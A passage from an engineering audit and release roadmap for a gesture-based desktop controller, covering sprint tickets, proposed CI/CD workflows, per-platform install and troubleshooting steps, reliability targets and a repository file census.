|S1-9: Add `--strict-markers`, `--strict-config`, `--cov=gesture\\\\\\\_controller` to `addopts`|—|S|Pytest fails on unknown marker|
|S1-10: Apply `@pytest.mark.e2e` to `test\\\\\\\_minimize\\\\\\\_gesture.py`|—|S|`pytest -m "not e2e"` skips it|
|S1-11: Replace naive `test\\\\\\\_config\\\\\\\_ast\\\\\\\_safety.py` with AST-walk scanner|—|M|Scanner catches `eval()` in `config\\\\\\\_manager.py`|
|S1-12: Add real-MediaPipe integration test (gated behind `@pytest.mark.real\\\\\\\_mediapipe`)|—|M|Test runs if model file present; skipped otherwise|
|S1-13: Add `SECURITY.md`, `CONTRIBUTING.md`, `CODE\\\\\\\_OF\\\\\\\_CONDUCT.md`, `CHANGELOG.md`, `CODEOWNERS`, PR template|P1-57|M|All 6 files exist|
|S1-14: Write missing ADRs 005–010|P1-58|M|10 ADRs in `docs/adr/`|
|S1-15: Tighten `config\\\\\\\_schema.json` (`additionalProperties:false`, `required`, `enum`, ranges)|P1-59|M|Typos in config rejected at load time|
|S1-16: Extend `gesture\\\\\\\_schema.json` to cover `version`, `config`, `app\\\\\\\_profiles`|P1-60|M|`predefined\\\\\\\_gestures.yaml` fully validated|
|S1-17: Add `release-please` + Conventional Commits|P1-70|S|Tags produce GitHub releases with auto-generated changelog|
|S1-18: Add `pip-audit`, `safety`, `bandit`, `semgrep` to CI|P1-73|S|Security job in CI runs all 4|
**Sprint 1 exit criteria:** CI green on 3 OSes. `pytest --cov` reports ≥80%. No P0 regressions.
### Sprint 2 — Installers + Onboarding (Weeks 3–4)
**Goal:** Build installers for all 3 platforms. Implement first-run permission wizard.
|Ticket|Sev|Effort|Acceptance criteria|
|-|-|-|-|
|S2-1: Rewrite `gesture\\\\\\\_controller.spec` (no `block\\\\\\\_cipher`, `BUNDLE` for macOS, `Info.plist`, real icon)|P1-65|M|PyInstaller produces `.app` on macOS, `.exe` in dir on Windows|
|S2-2: Create `packaging/macos/Info.plist` with `NSCameraUsageDescription`, `NSAccessibilityUsageDescription`, `LSUIElement=True`|P1-65|S|macOS .app launches without TCC hard-block|
|S2-3: Create `packaging/macos/entitlements.plist`|P1-65|S|Hardened Runtime entitlements for notarization|
|S2-4: Create `packaging/windows\\\\\\\_installer.nsi` (NSIS)|P0-24|M|`GestureController-Setup-<ver>.exe` produced by build|
|S2-5: Create `packaging/linux/install.sh` (dedicated group, udev, systemd user service)|P0-27, P1-66|M|`./install.sh` installs and configures everything for current user|
|S2-6: Create `packaging/linux/gesture-controller.service` (systemd user service)|P1-66|S|`systemctl --user enable --now gesture-controller` works|
|S2-7: Update udev rule to use dedicated `gesture-controller` group|P0-27|S|Rule no longer grants `input` group write access|
|S2-8: Implement `gui/onboarding.py` (macOS Accessibility + Camera + Input Monitoring prompts; Linux udev check; Windows UIPI check)|P1-67|L|First-run user sees actionable permission prompts|
|S2-9: macOS code signing + notarization in release workflow|P1-64|L|`xcrun notarytool submit` in CI; stapled .app passes Gatekeeper|
|S2-10: Windows Authenticode signing in release workflow|P1-64|L|Signed .exe passes SmartScreen without warning|
|S2-11: Move `verify\\\\\\\_install.py` to `gesture\\\\\\\_controller/cli/verify\\\\\\\_install.py` + console script|P1-68|S|`gesture-controller-verify` works after `pip install`|
|S2-12: Add `scripts/download\\\\\\\_models.py` invoked by `pip install` (or `setuptools.cmdclass`)|—|M|`pip install .` fetches `hand\\\\\\\_landmarker.task` automatically|
|S2-13: Add `\\\\\\\_\\\\\\\_main\\\\\\\_\\\\\\\_.py` for `python -m gesture\\\\\\\_controller`|—|S|`python -m gesture\\\\\\\_controller` works|
**Sprint 2 exit criteria:** Unsigned `.exe`, `.dmg`, `.deb` artefacts produced by CI. First-run wizard prompts for permissions on macOS.
### Sprint 3 — Hardening + Observability (Weeks 5–6)
**Goal:** Plugin sandboxing, observability overhaul, config migration, security review.
|Ticket|Sev|Effort|Acceptance criteria|
|-|-|-|-|
|S3-1: Add `permissions` field to plugin manifest schema; refuse plugins declaring capabilities they don't have|—|M|Plugin with `permissions: \\\\\\\["os:input"]` can call `key\\\\\\\_combo`; without it, blocked|
|S3-2: Add per-handler failure counter in EventBus; auto-unsubscribe after N consecutive failures|P1 (DoS)|S|Crashing plugin is isolated after 5 failures|
|S3-3: Add structured metrics (counters + histograms) for: frame rate, FSM transitions, condition-eval exceptions, dispatcher latency, camera reconnects|P1-80|L|Metrics emitted to structlog; visible in logs as JSON|
|S3-4: Add correlation IDs to gesture events|P1-80|S|Logs link `raw\\\\\\\_landmarks` → `gesture\\\\\\\_triggered` → dispatch|
|S3-5: Add "Export Diagnostics" tray action|—|M|User can dump config + plugins + recent logs to a zip|
|S3-6: Add `core/config\\\\\\\_migrator.py` with `MIGRATIONS` registry|P1-61|M|`version: "1.0"` → `"2.0"` migration test passes|
|S3-7: Delete `eval()` from `SafeExpressionEvaluator`; migrate `compile\\\\\\\_condition` to use it|P1-9, P1-79|M|Single AST evaluator; no `eval()` anywhere|
|S3-8: Add `multiprocessing.Event` + sequence counter between camera and engine|P1-76|M|Engine sleeps on Event; no busy poll|
|S3-9: Make EventBus async (queue + worker thread) for non-critical events|P1-77|M|`gesture\\\\\\\_triggered` still synchronous (latency); `raw\\\\\\\_landmarks` async|
|S3-10: Refactor `GestureEngine.\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_` into `\\\\\\\_init\\\\\\\_\\\\\\\*` methods with rollback|P1-78|M|Init failure cleans up camera + shm|
|S3-11: Add `atheris` fuzz target for `compile\\\\\\\_condition`|—|M|Fuzz runs in nightly CI for 60s|
|S3-12: Add `RestrictedPython` to plugin loader as second layer of defense|—|L|Plugin can't call `os.system` even after `exec\\\\\\\_module`|
|S3-13: SHA256 verification on `hand\\\\\\\_landmarker.task`|P1-22|S|Tampered model file rejected at startup|
|S3-14: `chmod 600` on SharedMemory after creation|P1 (info disclosure)|S|`/dev/shm/psm\\\\\\\_\\\\\\\*` mode 0600|
|S3-15: Add i18n infrastructure (`tr()` calls, `.ts` files for en/es/zh)|—|M|Settings window translatable|
|S3-16: Add a11y (`setAccessibleName` on all widgets)|—|M|Screen reader announces tray + settings|
|S3-17: Auto-detect dark/light theme via `QGuiApplication.styleHints().colorScheme()`|P1-51|S|Settings window matches system theme|
**Sprint 3 exit criteria:** Plugin sandbox in place. Metrics emitted. Fuzz target runs nightly. Security review by external reviewer (optional but recommended).
### Sprint 4 — Release Hardening (Weeks 7–8)
**Goal:** Real-hardware tests, replay infrastructure, benchmark suite, v1.0 release.
|Ticket|Sev|Effort|Acceptance criteria|
|-|-|-|-|
|S4-1: Add 5 replay fixture files in `tests/replay/fixtures/` (minimize, swipe, pinch, scroll, custom)|P1-54|M|Replay tests load fixtures and assert gesture detection|
|S4-2: Add 4 benchmark tests (`bench\\\\\\\_one\\\\\\\_euro`, `bench\\\\\\\_dtw`, `bench\\\\\\\_fsm`, `bench\\\\\\\_full\\\\\\\_pipeline`)|P1-54|M|`pytest --benchmark` produces baseline JSON|
|S4-3: Add hardware-in-loop test harness (gated behind `@pytest.mark.requires\\\\\\\_hardware`)|—|L|Test opens real `/dev/uinput` on Linux; `CGEventPost` on macOS|
|S4-4: Re-enable GC in `conftest.py`; fix PyQt6 teardown root cause|P2|M|Tests pass with GC enabled; no segfaults|
|S4-5: Performance regression test: end-to-end latency < 50ms on commodity hardware|—|M|CI benchmark asserts p95 < 50ms|
|S4-6: Add `ruamel.yaml` for round-trip config preservation|P1-49|S|Settings save preserves user comments|
|S4-7: Multi-monitor + HiDPI overlay support|P1-52, P1-48|M|Overlay covers correct screen on monitor plug-in|
|S4-8: Auto-update mechanism (Sparkle on macOS, Squirrel.Windows on Windows)|P2|L|App checks for updates on launch|
|S4-9: v1.0 release notes + blog post + demo GIFs|—|M|README has GIFs, Quick Start, OS-compat matrix|
|S4-10: Tag `v1.0.0` + GitHub Release with signed artefacts + SBOM|—|S|Release artefacts include `.exe`, `.dmg`, `.deb`, `sbom.cdx.json`|
**Sprint 4 exit criteria:** v1.0 tagged. Signed installers on GitHub Releases. SBOM attached. README no longer says `!!!UNTESTED!!!`.
### Post-v1.0 (v1.1–v1.2)
* Full plugin sandbox via subprocess + seccomp (Linux) / sandbox-exec (macOS) / AppContainer (Windows).
* Replace pyautogui with native SendInput on Windows.
* Replace `CGEventPost` with `AXUIElement` API for finer-grained macOS control.
* Wayland fractional-scale + multi-DPI overlay.
* Mobile companion app for gesture training.
* Cloud sync of custom gestures (opt-in, E2E encrypted).
\---
## 9\. CI/CD Design
### 9.1 Proposed `.github/workflows/ci.yml`
```yaml
name: CI
on:
  push:
    branches: \\\\\\\[main, develop]
  pull\\\\\\\_request:
permissions:
  contents: read
  security-events: write
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
      - uses: actions/setup-python@v5
        with: { python-version: "3.11" }
      - run: pip install .\\\\\\\[dev]
      - run: pre-commit run --all-files
      - run: ruff check gesture\\\\\\\_controller/
      - run: black --check gesture\\\\\\\_controller/
      - run: mypy --strict gesture\\\\\\\_controller/
  test:
    strategy:
      fail-fast: false
      matrix:
        os: \\\\\\\[ubuntu-latest, windows-latest, macos-latest]
        python: \\\\\\\["3.11", "3.12", "3.13"]
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "${{ matrix.python }}" }
      - run: pip install .\\\\\\\[dev]
      - run: pytest gesture\\\\\\\_controller/tests/unit/ gesture\\\\\\\_controller/tests/integration/ -ra --cov=gesture\\\\\\\_controller --cov-report=xml --cov-fail-under=80 --timeout=60 -m "not slow and not e2e and not real\\\\\\\_mediapipe"
      - if: matrix.os == 'ubuntu-latest' \\\\\\\&\\\\\\\& matrix.python == '3.12'
        uses: codecov/codecov-action@v4
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "3.11" }
      - run: pip install pip-audit safety bandit cyclonedx-bom semgrep
      - run: pip install .\\\\\\\[dev]
      - run: pip-audit --strict
      - run: safety check
      - run: bandit -r gesture\\\\\\\_controller/ -f sarif -o bandit.sarif || true
      - run: semgrep --config=auto --sarif --output=semgrep.sarif gesture\\\\\\\_controller/
      - run: cyclonedx-py environment -o sbom.cdx.json
      - uses: actions/upload-artifact@v4
        with: { name: sbom, path: sbom.cdx.json }
      - uses: github/codeql-action/upload-sarif@v3
        with: { sarif\\\\\\\_file: bandit.sarif }
  fuzz:
    runs-on: ubuntu-latest
    if: github.event\\\\\\\_name == 'schedule'  # nightly only
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "3.11" }
      - run: pip install .\\\\\\\[dev]
      - run: python tests/fuzz/fuzz\\\\\\\_compile\\\\\\\_condition.py -max\\\\\\\_total\\\\\\\_time=300
  build:
    needs: \\\\\\\[lint, test, security]
    strategy:
      matrix:
        include:
          - { os: windows-latest, cmd: pyinstaller gesture\\\\\\\_controller.spec --distpath dist/win --noconfirm }
          - { os: macos-latest,   cmd: pyinstaller gesture\\\\\\\_controller.spec --distpath dist/mac --noconfirm --windowed }
          - { os: ubuntu-latest,  cmd: pyinstaller gesture\\\\\\\_controller.spec --distpath dist/linux --noconfirm }
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "3.11" }
      - run: pip install pyinstaller .\\\\\\\[dev]
      - run: ${{ matrix.cmd }}
      - uses: actions/upload-artifact@v4
        with: { name: build-${{ matrix.os }}, path: dist/ }
  release:
    if: startsWith(github.ref, 'refs/tags/v')
    needs: build
    runs-on: ubuntu-latest
    permissions: { contents: write }
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with: { path: artifacts }
      - name: Sign Windows binary
        if: always()
        run: |
          # Sign with Authenticode (requires secrets.AZURE\\\\\\\_CERT\\\\\\\_URL etc.)
          # signtool sign /fd sha256 /tr http://timestamp.digicert.com /td sha256 \\\\\\\\
          #   /csp "Azure Key Vault" /kc "${{ secrets.AZURE\\\\\\\_KV }}" \\\\\\\\
          #   /f artifacts/build-windows-latest/GestureController/GestureController.exe
          echo "TODO: implement signing"
      - name: Notarize macOS .app
        if: always()
        run: |
          # xcrun notarytool submit artifacts/build-macos-latest/GestureController.app.zip \\\\\\\\
          #   --apple-id "${{ secrets.APPLE\\\\\\\_ID }}" \\\\\\\\
          #   --password "${{ secrets.APPLE\\\\\\\_APP\\\\\\\_PASSWORD }}" \\\\\\\\
          #   --team-id "${{ secrets.APPLE\\\\\\\_TEAM\\\\\\\_ID }}" --wait
          # xcrun stapler staple artifacts/build-macos-latest/GestureController.app
          echo "TODO: implement notarization"
      - uses: softprops/action-gh-release@v2
        with:
          generate\\\\\\\_release\\\\\\\_notes: true
          files: |
            artifacts/build-windows-latest/\\\\\\\*\\\\\\\*/\\\\\\\*
            artifacts/build-macos-latest/\\\\\\\*\\\\\\\*/\\\\\\\*
            artifacts/build-ubuntu-latest/\\\\\\\*\\\\\\\*/\\\\\\\*
            sbom.cdx.json
```
### 9.2 Proposed `.github/dependabot.yml`
```yaml
version: 2
updates:
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```
### 9.3 Proposed `.pre-commit-config.yaml`
```yaml
repos:
  - repo: https://github.com/astral-sh/ruff-pre-commit
    rev: v0.4.0
    hooks:
      - id: ruff
        args: \\\\\\\[--fix]
  - repo: https://github.com/psf/black
    rev: 24.4.0
    hooks:
      - id: black
  - repo: https://github.com/pre-commit/mirrors-mypy
    rev: v1.10.0
    hooks:
      - id: mypy
        additional\\\\\\\_dependencies: \\\\\\\[types-PyYAML, pydantic]
        args: \\\\\\\[--strict]
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.6.0
    hooks:
      - id: end-of-file-fixer
      - id: check-yaml
      - id: check-json
      - id: check-added-large-files
        args: \\\\\\\[--maxkb=10240]  # 10MB for hand\\\\\\\_landmarker.task
      - id: mixed-line-ending
      - id: trailing-whitespace
```
### 9.4 Release pipeline (semantic versioning)
1. Conventional Commits enforced via pre-commit (`commitizen`).
2. `release-please` opens a release PR on every Conventional Commit on `main`.
3. Merging the release PR tags `vX.Y.Z` and updates `CHANGELOG.md`.
4. Tag push triggers `release` job (above), which:
   * Builds installers on 3 OSes.
   * Signs Windows binary with Authenticode (Azure Key Vault).
   * Notarizes macOS .app with Apple Developer ID.
   * Generates CycloneDX SBOM.
   * Uploads all artefacts to GitHub Release.
5. SLSA provenance generated via `slsa-framework/slsa-github-generator`.
\---
## 10\. Deployment Runbook
End-user installation instructions for each platform, plus troubleshooting.
### 10.1 Linux (Ubuntu/Debian, Wayland or X11)
#### 10.1.1 Install via package script
```bash
# 1. Download the .deb or clone the repo
git clone https://github.com/aryansinghnagar/Maestro.git
cd Maestro
# 2. Run the install script (will prompt for sudo for udev rule only)
./packaging/linux/install.sh
```
What the script does:
1. Creates a dedicated `gesture-controller` group (NOT `input`).
2. Adds the current user to that group.
3. Installs `packaging/99-gesture-controller-uinput.rules` (granting the dedicated group write access to `/dev/uinput`).
4. Reloads udev rules.
5. `pip install --user ".\\\\\\\[linux]"`.
6. Installs `\\\\\\\~/.config/systemd/user/gesture-controller.service`.
**Log out and back in** for the group change to take effect.
#### 10.1.2 Enable auto-start
```bash
systemctl --user enable --now gesture-controller.service
```
#### 10.1.3 Verify
```bash
gesture-controller-verify
```
Expected output:
```
✓ Python 3.12.4
✓ OpenCV 4.9.0
✓ MediaPipe 0.10.14 (Tasks API)
✓ Camera 0: 640x480 @ 30fps
✓ /dev/uinput accessible (group=gesture-controller)
✓ Config loaded from \\\\\\\~/.config/gesture\\\\\\\_controller/config.yaml
```
#### 10.1.4 Troubleshooting
|Symptom|Cause|Fix|
|-|-|-|
|`PermissionError: \\\\\\\[Errno 13] Permission denied: '/dev/uinput'`|User not in `gesture-controller` group|`sudo usermod -aG gesture-controller $USER` then log out and back in|
|Tray icon doesn't appear|GNOME without tray extension|Install `gnome-shell-extension-appindicator`|
|Gestures detected but no action|Wrong window manager detected|Set `os\\\\\\\_integration.linux.window\\\\\\\_manager: "gnome"` (or `kwin`, `wlr`, `xdotool`) in config|
|Overlay doesn't cover screen|Multi-monitor + HiDPI|(Known issue — fixed in v1.1)|
|Camera not detected|OBS virtual cam at index 0|Set `camera.device\\\\\\\_id: 1` in config|
### 10.2 macOS (11 Big Sur or later)
#### 10.2.1 Install
1. Download `GestureController-<version>.dmg` from GitHub Releases.
2. Open the .dmg, drag GestureController to Applications.
3. **First launch**: right-click → Open (to bypass Gatekeeper for unsigned builds; not needed once signed).
4. On first launch, the onboarding wizard prompts for:
   * **Camera access** (TCC prompt).
   * **Accessibility access** (System Settings → Privacy \& Security → Accessibility → toggle GestureController on).
   * **Input Monitoring access** (same location).
#### 10.2.2 Verify
```bash
/Applications/GestureController.app/Contents/MacOS/GestureController --verify
```
#### 10.2.3 Troubleshooting
|Symptom|Cause|Fix|
|-|-|-|
|Gestures detected but no action|Accessibility permission not granted|System Settings → Privacy \& Security → Accessibility → enable GestureController|
|Camera shows black|Camera permission not granted|System Settings → Privacy \& Security → Camera → enable GestureController|
|`cmd+m` minimizes wrong window|Focused window doesn't support minimize|Use the gesture on a different window|
|Media keys don't work on Sonoma|`mediaremote-agent` intercepts|(Known issue — use `os\\\\\\\_integration.macos.use\\\\\\\_applescript: true` in config)|
### 10.3 Windows (10 1903+ or 11)
#### 10.3.1 Install
1. Download `GestureController-Setup-<version>.exe` from GitHub Releases.
2. Run the installer. If SmartScreen warns "Windows protected your PC", click More info → Run anyway (this goes away once we ship Authenticode-signed builds).
3. Launch GestureController from the Start Menu.
#### 10.3.2 Verify
```bash
"%LOCALAPPDATA%\\\\\\\\Programs\\\\\\\\GestureController\\\\\\\\gesture-controller-verify.exe"
```
#### 10.3.3 Troubleshooting
|Symptom|Cause|Fix|
|-|-|-|
|Gestures detected but no action in Task Manager|UIPI blocks standard-user → elevated input|Run GestureController as administrator (right-click → Run as administrator)|
|Mouse moves to (0,0) and app crashes|`pyautogui.FAILSAFE = True` (legacy)|Update to ≥ v1.0 (Patch 14 sets `FAILSAFE = False`)|
|Latency > 100ms|`pyautogui` is the default backend|Set `os\\\\\\\_integration.windows.use\\\\\\\_sendinput: true` in config (requires v1.1+)|
|Camera not detected|Camera at index > 0|Set `camera.device\\\\\\\_id: 1` in config|
### 10.4 Uninstall
|Platform|Command|
|-|-|
|Linux|`./packaging/linux/uninstall.sh` (removes service, udev rule, group membership; pip uninstall)|
|macOS|Drag GestureController from Applications to Trash|
|Windows|Add or Remove Programs → GestureController → Uninstall|
### 10.5 Diagnostic dump
If the user reports a bug, ask them to:
1. Right-click the tray icon → "Export Diagnostics".
2. Send the generated `maestro-diagnostics-<timestamp>.zip` to support.
The zip contains:
* `config.yaml` (sanitized: hotkeys redacted).
* `plugins.json` (list of loaded plugins + manifest hashes).
* `gestures.json` (active gesture definitions).
* `controller.json` (platform, controller type, supported actions).
* `logs/` (last 1000 log lines, structured JSON).
* `metrics.json` (current counters + histograms).
* `system.json` (OS version, Python version, camera info, GPU info).
\---
## 11\. KPIs, SLIs \& SLOs
### 11.1 Production-readiness KPIs (gate v1.0 release)
|KPI|Target|Current|Measurement|
|-|-|-|-|
|P0 issues open|0|28|This audit|
|P1 issues open|≤ 10|80|This audit|
|Unit test coverage|≥ 80%|\~60% (estimated)|`pytest --cov`|
|Integration test coverage|≥ 60%|\~20%|`pytest --cov`|
|CI green on 3 OSes|Yes|No CI|GitHub Actions|
|Signed installers on all 3 OSes|Yes|None|GitHub Release artefacts|
|SBOM published with every release|Yes|No|CycloneDX in release|
|`pip-audit` clean|Yes|Untested|CI security job|
|`bandit` clean (no HIGH)|Yes|Untested|CI security job|
|End-to-end latency p95|≤ 50 ms|\~150 ms (estimated)|Benchmark in CI|
|Crash-free sessions|≥ 99.5%|Unknown|Telemetry (opt-in)|
|README "Quick Start" works|Yes|No (3-step install)|Manual test|
|First-run wizard prompts for permissions|Yes|No|Manual test|
### 11.2 SLIs (Service Level Indicators) — for v1.0+
|SLI|Description|Target (SLO)|
|-|-|-|
|`gesture\\\\\\\_recognition\\\\\\\_rate`|Gestures detected / minute of active hand tracking|≥ 4 (user-perceived responsiveness)|
|`false\\\\\\\_positive\\\\\\\_rate`|Unintended gestures / hour|≤ 1|
|`gesture\\\\\\\_to\\\\\\\_action\\\\\\\_latency\\\\\\\_p50`|Time from gesture completion to OS action, 50th percentile|≤ 30 ms|
|`gesture\\\\\\\_to\\\\\\\_action\\\\\\\_latency\\\\\\\_p95`|Same, 95th percentile|≤ 50 ms|
|`gesture\\\\\\\_to\\\\\\\_action\\\\\\\_latency\\\\\\\_p99`|Same, 99th percentile|≤ 100 ms|
|`camera\\\\\\\_frame\\\\\\\_rate`|Sustained FPS during active tracking|≥ 28 (target 30)|
|`dropped\\\\\\\_frames\\\\\\\_per\\\\\\\_minute`|Frames dropped due to processing lag|≤ 2|
|`crash\\\\\\\_free\\\\\\\_sessions`|% of sessions ending without a crash|≥ 99.5%|
|`plugin\\\\\\\_load\\\\\\\_success\\\\\\\_rate`|% of plugins loaded without error|≥ 99%|
|`os\\\\\\\_action\\\\\\\_success\\\\\\\_rate`|% of dispatched actions that completed without exception|≥ 99.5%|
|`first\\\\\\\_run\\\\\\\_completion\\\\\\\_rate`|% of users who complete onboarding wizard|≥ 80%|
|`accessibility\\\\\\\_permission\\\\\\\_grant\\\\\\\_rate` (macOS)|% of users who grant Accessibility within first session|≥ 90%|
### 11.3 SLOs (Service Level Objectives)
For a v1.0 release:
* **Availability:** 99.5% crash-free sessions over any 7-day window.
* **Latency:** p95 gesture-to-action ≤ 50 ms over any 1-hour window.
* **Accuracy:** false-positive rate ≤ 1/hour over any 1-hour window.
If any SLO is violated for 2 consecutive windows, page the on-call maintainer (or, for OSS, open a P0 issue).
### 11.4 Telemetry (opt-in)
Telemetry is **off by default** (`logging.telemetry\\\\\\\_enabled: false` in `default\\\\\\\_config.yaml`). If the user opts in, the following anonymous metrics are sent to a self-hosted PostHog instance once per session:
* OS version, Python version, app version.
* Controller type (Linux uinput / macOS Quartz / Windows SendInput).
* Number of plugins loaded.
* Aggregate counters: gestures detected (by name), actions dispatched (by type), crashes (by stack trace hash).
* Aggregate latencies: p50, p95, p99 gesture-to-action.
* **NOT sent:** camera frames, hand landmarks, foreground app names, gesture YAML contents, plugin source code.
The telemetry endpoint, schema, and a "View exactly what's sent" button must be in the Settings window.
\---
## 12\. Appendices
### Appendix A — Files in repository (census)
|Path|Type|Lines|Notes|
|-|-|-|-|
|`gesture\\\\\\\_controller/\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py`|Python|22|Windows monkeypatch (P0-1)|
|`gesture\\\\\\\_controller/main.py`|Python|4|Duplicate of top-level `main.py`|
|`gesture\\\\\\\_controller/core/\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py`|Python|1|Empty|
|`gesture\\\\\\\_controller/core/engine.py`|Python|\~310|God-method `\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_` (P1-78)|
|`gesture\\\\\\\_controller/core/state\\\\\\\_machine.py`|Python|\~390|Chained-comparison bug (P0-9)|
|`gesture\\\\\\\_controller/core/event\\\\\\\_bus.py`|Python|\~50|Synchronous, dead `\\\\\\\_queue`|
|`gesture\\\\\\\_controller/core/config\\\\\\\_manager.py`|Python|\~190|`eval()` in SafeExpressionEvaluator (P1-9)|
|`gesture\\\\\\\_controller/vision/camera\\\\\\\_stream.py`|Python|\~140|BGRA + cap.set bugs|
|`gesture\\\\\\\_controller/vision/landmark\\\\\\\_extractor.py`|Python|\~100|IMAGE mode (P0-2)|
|`gesture\\\\\\\_controller/vision/one\\\\\\\_euro\\\\\\\_filter.py`|Python|\~110|250× too small params (P0-3)|
|`gesture\\\\\\\_controller/models/data\\\\\\\_types.py`|Python|\~90|`assert` for landmark count|
|`gesture\\\\\\\_controller/models/dtw\\\\\\\_matcher.py`|Python|\~270|No cooldown (P0-4)|
|`gesture\\\\\\\_controller/models/feature\\\\\\\_engineering.py`|Python|\~140|z-scale bug|
|`gesture\\\\\\\_controller/os\\\\\\\_integration/base\\\\\\\_controller.py`|Python|\~60|ABC|
|`gesture\\\\\\\_controller/os\\\\\\\_integration/action\\\\\\\_dispatcher.py`|Python|\~130|No key normalization (P0-11)|
|`gesture\\\\\\\_controller/os\\\\\\\_integration/linux\\\\\\\_wayland\\\\\\\_controller.py`|Python|\~370|Many P0/P1 bugs|
|`gesture\\\\\\\_controller/os\\\\\\\_integration/macos\\\\\\\_controller.py`|Python|\~260|`cmd+m` → `cmd+a` (P0-12)|
|`gesture\\\\\\\_controller/os\\\\\\\_integration/windows\\\\\\\_controller.py`|Python|\~120|`FAILSAFE = True` (P0-16)|
|`gesture\\\\\\\_controller/plugins/plugin\\\\\\\_loader.py`|Python|\~180|Unsanboxed execution (P0-17)|
|`gesture\\\\\\\_controller/plugins/builtin/media\\\\\\\_gestures.py`|Python|\~50||
|`gesture\\\\\\\_controller/gui/app\\\\\\\_entry.py`|Python|\~140|Qt threading (P0-18)|
|`gesture\\\\\\\_controller/gui/tray\\\\\\\_icon.py`|Python|\~140|Threading + HiDPI|
|`gesture\\\\\\\_controller/gui/settings\\\\\\\_window.py`|Python|\~410|Path traversal (P0-20)|
|`gesture\\\\\\\_controller/gui/overlay.py`|Python|\~160|Hardcoded font|
|`gesture\\\\\\\_controller/gui/gesture\\\\\\\_recorder.py`|Python|\~240|Hardcoded "Right"|
|`gesture\\\\\\\_controller/actions/action\\\\\\\_mapper.py`|Python|2|Dead code|
|`gesture\\\\\\\_controller/data/default\\\\\\\_config.yaml`|YAML|\~60|Dangerous defaults|
|`gesture\\\\\\\_controller/data/config\\\\\\\_schema.json`|JSON|\~50|No `additionalProperties:false`|
|`gesture\\\\\\\_controller/data/predefined\\\\\\\_gestures.yaml`|YAML|\~110|Windows-only app\_profiles|
|`gesture\\\\\\\_controller/data/gesture\\\\\\\_schema.json`|JSON|\~40|Doesn't cover app\_profiles|
|`gesture\\\\\\\_controller/data/hand\\\\\\\_landmarker.task`|Binary|\~10 MB|No SHA256|
|`gesture\\\\\\\_controller/tests/`|Tests|31 files|See §4.6|
|`packaging/99-gesture-controller-uinput.rules`|udev|1|Broad `input` group (P0-27)|
|`scripts/verify\\\\\\\_install.py`|Python|\~80|Wrong PyInstaller path|
|`setup.py`|Python|4|Dead stub|
|`pyproject.toml`|TOML|\~85|License mismatch (P0-22)|
|`requirements.txt`|Text|11|Duplicates pyproject|
|`requirements-dev.txt`|Text|10|Duplicates pyproject|
|`gesture\\\\\\\_controller.spec`|PyInstaller|\~65|`block\\\\\\\_cipher` removed in PyInstaller 6|
|`README.md`|Markdown|\~140|`!!!UNTESTED!!!` (P0-28)|
|`master\\\\\\\_development\\\\\\\_plan.md`|Markdown|1108|Future-dated|
|`plan.md`, `implementation\\\\\\\_plan.md`, `implementation\\\\\\\_guide.md`|Markdown|\~2200|Out of sync|
|`sys\\\\\\\_prompt\\\\\\\_{1,2,3}.txt`|Text|\~2400|Out of sync|
|`agent\\\\\\\_prompts/\\\\\\\*.md` (7 files)|Markdown|\~3500|Phase specs|
|`docs/adr/adr-00{1,2,3,4}-\\\\\\\*.md`|Markdown|\~80|6 more promised|
|`LICENSE`|Text|661|AGPL-3.0|
### Appendix B — Glossary
|Term|Definition|
|-|-|
|**One-Euro Filter**|Adaptive low-pass filter for noisy real-time input. Params: `min\\\\\\\_cutoff` (Hz), `beta` (speed coefficient), `derivate\\\\\\\_cutoff` (Hz). Paper: Casiez et al. CHI 2012.|
|**DTW**|Dynamic Time Warping. Algorithm for measuring similarity between two temporal sequences that may differ in speed. O(n·m) per pair.|
|**FSM**|Finite State Machine. Per-gesture model with states (`Idle`, `Trigger`, `ScrollingActive`, ...) and transitions guarded by conditions over a `FeatureVector`.|
|**FeatureVector**|Dataclass of geometric invariants computed from hand landmarks: pinch distance, finger extensions, palm velocity, etc.|
|**uinput**|Linux kernel interface for creating virtual input devices. Requires `CAP\\\\\\\_SYS\\\\\\\_INPUT` or membership in a group with write access to `/dev/uinput`.|
|**CGEventPost**|macOS Core Graphics API for posting low-level input events at the HID event tap. Requires Accessibility permission.|
|**SendInput**|Windows API for synthesizing keystrokes, mouse motion, and button clicks. Not subject to UIPI when called from a standard-user process targeting elevated processes.|
|**pyautogui**|Cross-platform Python library for input automation. Wraps Xlib (Linux), pyobjc (macOS), SendInput (Windows). Adds 10ms pause per call by default.|
|**STRIDE**|Microsoft threat-modeling framework: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege.|
|**SBOM**|Software Bill of Materials. Machine-readable list of all components in a software artefact. Formats: CycloneDX, SPDX.|
|**SLSA**|Supply-chain Levels for Software Artefacts. Framework for ensuring integrity of build provenance. Levels 1–4.|
|**UIPI**|User Interface Privilege Isolation. Windows feature that blocks input from lower-privilege processes to higher-privilege windows.|
|**TCC**|Transparency, Consent, and Control. macOS framework for managing app permissions (Camera, Microphone, Accessibility, Input Monitoring, etc.).|
### Appendix C — Recommended tooling
|Tool|Purpose|When to use|
|-|-|-|
|`ruff`|Linting + import sorting|Pre-commit, CI|
|`black`|Code formatting|Pre-commit, CI|
|`mypy --strict`|Type checking|Pre-commit, CI|
|`pytest`|Test runner|CI, local|
|`pytest-cov`|Coverage|CI|
|`pytest-benchmark`|Performance benchmarks|CI nightly|
|`pytest-qt`|Qt testing|Unit tests for GUI|
|`hypothesis`|Property-based testing|Unit tests|
